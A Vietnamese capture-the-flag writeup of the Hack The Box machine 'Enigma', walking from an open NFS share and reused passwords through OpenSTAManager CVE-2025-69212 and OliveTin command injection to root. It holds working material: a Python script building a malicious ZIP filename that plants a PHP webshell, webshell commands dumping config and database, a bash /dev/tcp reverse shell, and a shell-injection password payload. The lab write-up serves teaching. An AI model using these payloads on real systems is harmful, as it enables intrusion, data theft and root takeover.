---
title: "Enigma Writeup - Hack The Box"
date: 2026-07-06 00:00:00 +0700
categories: [Hack The Box, Seasonal Machines]
tags:
  [
    hackthebox,
    enigma,
    nfs,
    roundcube,
    openstamanager,
    cve-2025-69212,
    command-injection,
    olivetin,
    linux,
  ]
---

> Machine: Enigma  
> Difficulty: Easy  
> OS: Linux  
> Tags: NFS, Roundcube, OpenSTAManager, CVE-2025-69212, Command Injection, OliveTin, Linux  
> Disclaimer: Bài viết được thực hiện trong môi trường HackTheBox được cấp quyền.

## Tổng quan

Enigma là một machine có attack path khá hay vì không đi thẳng từ một web exploit sang shell. Quá trình khai thác gồm nhiều bước pivot nhỏ, mỗi bước đều cần đọc hint và suy luận đúng hướng:

```text
NFS share
-> PDF onboarding
-> Kevin webmail
-> Password mặc định bị dùng lại với Sarah
-> OpenSTAManager admin
-> CVE-2025-69212 trong P7M file processing
-> Tạo PHP webshell qua ZIP import
-> www-data
-> Crack hash của Haris
-> User shell
-> OliveTin chạy root
-> Command injection
-> Root
```

Điểm mình thích ở machine này là có vài hướng ban đầu nhìn rất có tiềm năng nhưng cuối cùng không đi đến đâu, ví dụ như fuzz NFS path, tìm hidden mailbox folder, hay thử abuse upload attachment của Roundcube. Tuy nhiên, các bước đó vẫn giúp mình loại trừ giả thuyết và hiểu rõ hơn bề mặt tấn công của target.

## 1. Recon ban đầu

Mình thêm hostname vào `/etc/hosts`:

```bash
echo '10.129.16.205 enigma.htb mail001.enigma.htb support_001.enigma.htb' | sudo tee -a /etc/hosts
```

Sau đó scan toàn bộ TCP port:

```bash
nmap -p- --min-rate 5000 -Pn 10.129.16.205 -oN full_tcp.nmap
```

Những port đáng chú ý:

```text
22    SSH
80    HTTP
110   POP3
143   IMAP
993   IMAPS
995   POP3S
111   rpcbind
2049  NFS
```

Scan service/version:

```bash
nmap -sC -sV -p22,80,110,111,143,993,995,2049 10.129.16.205 -oN services.nmap
```

Ban đầu mình chú ý đến NFS vì target expose `rpcbind` và port `2049`.

## 2. Enumerate NFS

Liệt kê các NFS export:

```bash
showmount -e 10.129.16.205
```

Kết quả:

```text
/srv/nfs/onboarding *
```

Mount share:

```bash
sudo mkdir -p /mnt/enigma

sudo mount -t nfs -o vers=3,nolock \
10.129.16.205:/srv/nfs/onboarding /mnt/enigma
```

Kiểm tra file bên trong:

```bash
find /mnt/enigma -type f -ls
```

Có một file PDF:

```text
New_Employee_Access.pdf
```

Đọc nội dung PDF:

```bash
pdftotext /mnt/enigma/New_Employee_Access.pdf -
```

Nội dung đáng chú ý:

```text
Employee: Kevin Mitchell
Department: Operations

Webmail Access:
URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

Trong PDF cũng có hint rằng nhân viên cần đổi mật khẩu sau lần đăng nhập đầu tiên. Chi tiết này khá quan trọng: password `Enigma2024!` nhìn giống một mật khẩu mặc định/onboarding hơn là password riêng của Kevin.

## 3. Những hướng mình đã thử nhưng chưa đi đến đâu

Trước khi pivot tiếp, mình đã thử khá nhiều hướng khác.

### 3.1. SSH Password Reuse

Mình thử SSH với Kevin:

```bash
ssh kevin@10.129.16.205
```

Nhưng server trả về:

```text
Permission denied (publickey).
```

Điều này cho thấy SSH server chỉ cho phép public key authentication. Dù đã có password webmail, mình không thể ép server chuyển sang password authentication từ phía client.

Option như dưới đây không thể bypass cấu hình server:

```bash
ssh -o PreferredAuthentications=password \
-o PubkeyAuthentication=no \
kevin@10.129.16.205
```

Nếu server không bật password authentication thì client không làm gì được.

### 3.2. Fuzz thêm NFS Export

Mình cũng thử đoán các path NFS phổ biến:

```text
/srv/nfs/shared
/srv/nfs/backup
/srv/nfs/credentials
/srv/nfs/public
```

Nhưng không có path nào tồn tại ngoài `/srv/nfs/onboarding`.

NFSv4 pseudo-root cũng không reveal thêm dữ liệu.

### 3.3. Roundcube Attachment và Mailbox Enumeration

Sau khi login Roundcube bằng Kevin, mailbox chỉ có một mail từ Sarah. Nội dung nói rằng system credential sẽ được gửi qua "company shared drive".

Mình đã thử:

- Kiểm tra Inbox, Sent, Trash.
- Tìm folder ẩn.
- Upload attachment lên Roundcube.
- Thử thay đổi attachment ID.
- Thử bỏ hoặc sửa compose ID.
- Thử một số hành vi path traversal/IDOR.

Tuy nhiên request download attachment của Roundcube bị bind khá chặt với session, CSRF token và compose ID. Mình không thấy dấu hiệu arbitrary file read hoặc upload abuse.

SMTP outbound cũng lỗi authentication nên không thể gửi mail sang Sarah để trigger workflow.

Nhìn lại thì hướng này không sai, nhưng không phải intended path.

## 4. Pivot từ Kevin sang Sarah

Từ PDF onboarding, có hai chi tiết mình thấy đáng chú ý:

- Kevin nhận password ban đầu là `Enigma2024!`.
- PDF yêu cầu nhân viên đổi mật khẩu sau lần đăng nhập đầu tiên.

Điều này làm mình nghĩ `Enigma2024!` là password mặc định được dùng cho nhân viên mới. Vì trong mailbox của Kevin có mail từ Sarah, mình thử password reuse với user `sarah` trên Roundcube:

```text
Username: sarah
Password: Enigma2024!
```

Login thành công.

Trong inbox của Sarah có mail từ IT Support:

```text
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

![Credential OpenSTAManager từ mailbox của Sarah](/assets/img/20260706-enigma-htb-writeup/cred_OpenSTA.png)

Đây là pivot quan trọng dẫn sang OpenSTAManager.

## 5. OpenSTAManager và CVE-2025-69212

Truy cập:

```text
http://support_001.enigma.htb
```

Đăng nhập:

```text
Username: admin
Password: Ne3s4rtars78s
```

Ban đầu mình nghĩ "company shared drive" sẽ liên quan đến Documents management hoặc Storage, nhưng hướng quan trọng hơn lại nằm ở chức năng import hóa đơn/file.

Mình đã kiểm tra:

- Documents management
- Document categories
- Users and permissions
- Storage
- Storage connectors
- Import/Invoice-related plugins
- Updates
- Các mục Tools

Sau khi biết target đang chạy OpenSTAManager 2.9.8, mình tìm thêm public advisory liên quan đến phiên bản này và thấy [GHSA-25fp-8w8p-mx36](https://github.com/advisories/GHSA-25fp-8w8p-mx36), tương ứng CVE-2025-69212.

Lỗ hổng này nằm trong phần xử lý file `.p7m` khi import ZIP. Flow tổng quát như sau:

```text
Attacker có tài khoản hợp lệ
-> Upload ZIP qua importFE_ZIP/import invoice functionality
-> ZIP chứa file .p7m với filename độc hại
-> OpenSTAManager extract ZIP và gọi XML::decodeP7M()
-> Filename đi vào exec() khi chạy openssl
-> Command injection dưới quyền web server user
```

Phần đáng chú ý nằm ở logic decode P7M. File path được đưa vào command `openssl` nhưng không được escape an toàn:

```php
exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER -out "'.$output_file.'"', $output, $cmd);
```

Vì filename trong ZIP là dữ liệu attacker kiểm soát, mình có thể đóng quote và chèn command mới.

Một lưu ý nhỏ: khi dùng `ZipArchive::extractTo()`, ký tự `/` trong filename có thể bị xử lý như path separator. Vì vậy payload nên tránh dùng absolute path như `/var/www/...`; thay vào đó có thể `cd` vào thư mục phù hợp rồi ghi file.

## 6. Tạo Webshell Qua ZIP Import

Mục tiêu của mình là tạo một webshell trong thư mục web-accessible `files/`.

Tạo ZIP chứa một file `.p7m` có filename độc hại:

```python
import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile("exploit.zip", "w") as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

Sau đó upload `exploit.zip` qua chức năng import hóa đơn/ZIP của OpenSTAManager.

![Upload ZIP qua chức năng import của OpenSTAManager](/assets/img/20260706-enigma-htb-writeup/import_zip.png)

Khi ứng dụng extract ZIP và gặp file kết thúc bằng `.p7m`, nó gọi `XML::decodeP7M()`. Filename độc hại sẽ làm command render tương đương:

```bash
openssl smime -verify -noverify -in "invoice.p7m";cd files && echo '<?php system($_GET["c"]); ?>' > SHELL.php;echo ".p7m" -inform DER -out "..."
```

Response có thể trả lỗi `500` vì nội dung `.p7m` không phải XML/P7M hợp lệ, nhưng command đã được thực thi trước khi ứng dụng fail ở bước parse.

Sau đó kiểm tra webshell:

```bash
curl -i 'http://support_001.enigma.htb/files/SHELL.php?c=id'
```

Kết quả:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![Webshell thực thi lệnh id dưới quyền www-data](/assets/img/20260706-enigma-htb-writeup/shell_id_wwwdata.png)

Lúc này mình đã có RCE dưới quyền `www-data`.

Một chi tiết dễ gây nhiễu là trong thư mục `files` có thể có `.htaccess` với rule tắt PHP execution:

```apache
php_flag engine off
```

Tuy nhiên target dùng nginx ở phía ngoài, mà nginx không xử lý `.htaccess`. Vì vậy `SHELL.php` vẫn được execute bình thường.

## 7. Database Dump và Hash của Haris

Sau khi có RCE, mình quay lại hướng giống ban đầu: dump database ra local rồi inspect offline. Cách này dễ grep, dễ lưu evidence, và đỡ bị rối bởi output HTML/escaping khi query trực tiếp qua webshell.

Đầu tiên kiểm tra source/config của OpenSTAManager để lấy database credential:

```bash
curl -sG \
  --data-urlencode 'c=cat /var/www/html/openstamanager/config.php' \
  'http://support_001.enigma.htb/files/SHELL.php'
```

Sau khi có credential database, mình dump database qua webshell về máy Kali:

```bash
curl -sG \
  --data-urlencode 'c=mysqldump -u<DB_USER> -p<DB_PASS> <DB_NAME>' \
  'http://support_001.enigma.htb/files/SHELL.php' \
  -o database.sql
```

Sau đó inspect local như bình thường:

```bash
grep -niE 'haris|password|passwd|INSERT INTO.*user' database.sql
```

Mình tìm được user `haris` cùng bcrypt hash.

![Hash của user Haris trong database dump](/assets/img/20260706-enigma-htb-writeup/user_pass.png)

Tạo file hash:

```bash
cat > hashes.txt <<'EOF'
haris:<BCRYPT_HASH>
EOF
```

Crack bằng John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt \
--format=bcrypt hashes.txt
```

Kết quả:

```text
haris:bestfriends
```

![Crack bcrypt hash của Haris bằng John](/assets/img/20260706-enigma-htb-writeup/crack_pass.png)

## 8. Reverse Shell và User Flag

Mở listener trên Kali:

```bash
rlwrap nc -lvnp 4444
```

Dùng webshell để tạo reverse shell:

```bash
curl -sG \
  --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"' \
  'http://support_001.enigma.htb/files/SHELL.php'
```

Sau khi nhận shell, mình upgrade TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Chuyển sang Haris:

```bash
su - haris
```

Password:

```text
bestfriends
```

Sau đó lấy user flag:

```bash
whoami
cat ~/user.txt
```

![Shell user Haris](/assets/img/20260706-enigma-htb-writeup/user_harisshell.png)

## 9. Enumerate Privilege Escalation

Sau khi có shell Haris, mình bắt đầu kiểm tra các service chạy bằng quyền cao.

```bash
ps aux | grep -i olivetin
```

Kết quả cho thấy OliveTin chạy bằng root:

```text
root ... /usr/local/bin/OliveTin
```

Kiểm tra service:

```bash
systemctl cat OliveTin
```

Service không chỉ định custom config path, nên config mặc định nằm tại:

```text
/etc/OliveTin/config.yaml
```

Lọc những phần đáng chú ý:

```bash
grep -nEi 'actions:|title:|shell:|arguments:|auth|permissions' \
/etc/OliveTin/config.yaml
```

Mình tìm thấy action sau:

```yaml
- title: Backup Database
  id: backup-database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  popupOnStart: execution-dialog
  arguments:
    - name: db_user
      type: ascii_identifier
    - name: db_pass
      type: password
    - name: db_name
      type: ascii_identifier
```

![OliveTin action Backup Database](/assets/img/20260706-enigma-htb-writeup/action_olivertin.png)

Ngoài ra config cũng cho thấy guest không cần login và có quyền execute:

```yaml
authRequireGuestsToLogin: false

defaultPermissions:
  view: true
  exec: true
  logs: true
```

Trước khi tunnel, mình kiểm tra OliveTin đang listen ở đâu:

```bash
ss -ltnp | grep 1337
```

Nếu service chỉ listen trên localhost của target, mình cần SSH port forward để truy cập giao diện OliveTin từ máy Kali.

## 10. Command Injection trong OliveTin

Vấn đề nằm ở biến `db_pass`.

Giá trị này được đặt trong single quote:

```bash
-p'{{ db_pass }}'
```

Nhưng không có escaping an toàn. `db_user` và `db_name` dùng type `ascii_identifier`, nên khó chen các ký tự đặc biệt hơn. Trong khi đó `db_pass` dùng type `password`, nhưng type này chỉ che ký tự trên giao diện, không đồng nghĩa với việc input được sanitize an toàn.

Để tunnel OliveTin ổn định hơn, mình tạo một SSH key riêng trên Kali:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/haris_htb -C haris@enigma
```

Sau đó lấy public key:

```bash
cat ~/.ssh/haris_htb.pub
```

Mình thêm public key đó vào account Haris trên target:

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh

echo 'ssh-ed25519 <PUBLIC_KEY> haris@enigma' >> ~/.ssh/authorized_keys

chmod 600 ~/.ssh/authorized_keys
```

Từ Kali, dùng private key vừa tạo để SSH port forward OliveTin:

```bash
ssh -i ~/.ssh/haris_htb \
-o IdentitiesOnly=yes \
-L 1337:127.0.0.1:1337 \
haris@10.129.16.205
```

Sau đó truy cập:

```text
http://127.0.0.1:1337
```

Trong action `Backup Database`, mình nhập payload vào field `db_pass`:

```bash
x'; id; #
```

Sau khi render, command sẽ tương đương:

```bash
mysqldump -u USER -p'x'; id; #' DATABASE > /opt/backups/backup.sql
```

Payload này đóng single quote của password, chạy lệnh `id`, rồi comment phần lệnh còn lại bằng `#`.

Output trả về:

```text
uid=0(root) gid=0(root) groups=0(root)
```

![Command injection chạy dưới quyền root](/assets/img/20260706-enigma-htb-writeup/id_root.png)

Để lấy root flag, mình thay payload thành:

```bash
x'; cat /root/root.txt; #
```

![Root flag](/assets/img/20260706-enigma-htb-writeup/root_flag.png)

## 11. Lessons Learned

Qua machine này, mình rút ra một số điểm khá hay:

- NFS public share thường là nơi chứa onboarding document, backup hoặc credential nội bộ.
- Nếu tài liệu onboarding ghi password cần được đổi ở lần đăng nhập đầu tiên, hãy xem đó là password mặc định và thử password reuse có kiểm soát.
- Password reuse giữa các mailbox là một hướng pivot đáng thử khi có credential đầu tiên.
- Không phải hint nào nói "shared drive" cũng dẫn trực tiếp đến SMB, NFS hay file manager.
- Chức năng import file/ZIP cần được kiểm tra kỹ, đặc biệt khi filename được đưa vào xử lý phía server.
- Khi ứng dụng gọi command hệ thống với dữ liệu người dùng kiểm soát, `escapeshellarg()` hoặc cơ chế tương đương là bắt buộc.
- `.htaccess` không có tác dụng với nginx nếu nginx không được cấu hình để xử lý rule tương ứng.
- Input type `password` không đồng nghĩa với input an toàn.
- Một service chạy root nhưng cho guest execute command là bề mặt tấn công rất nguy hiểm.
- Các hướng đi sai vẫn quan trọng vì chúng giúp loại trừ giả thuyết và hiểu rõ target hơn.

## Kết luận

Enigma không khó về từng exploit riêng lẻ, nhưng yêu cầu pivot đúng lúc và đọc hint cẩn thận.

Ban đầu mình mất khá nhiều thời gian ở NFS guessing, Roundcube attachment, SMTP và Documents management. Cuối cùng, hướng đúng lại là password reuse để vào OpenSTAManager, abuse CVE-2025-69212 trong P7M/ZIP import để tạo webshell, crack hash từ database, rồi abuse OliveTin configuration để lên root.

Attack path cuối cùng:

```text
NFS
-> Kevin
-> Sarah
-> OpenSTAManager admin
-> CVE-2025-69212 P7M command injection
-> www-data
-> Haris
-> OliveTin command injection
-> root
```
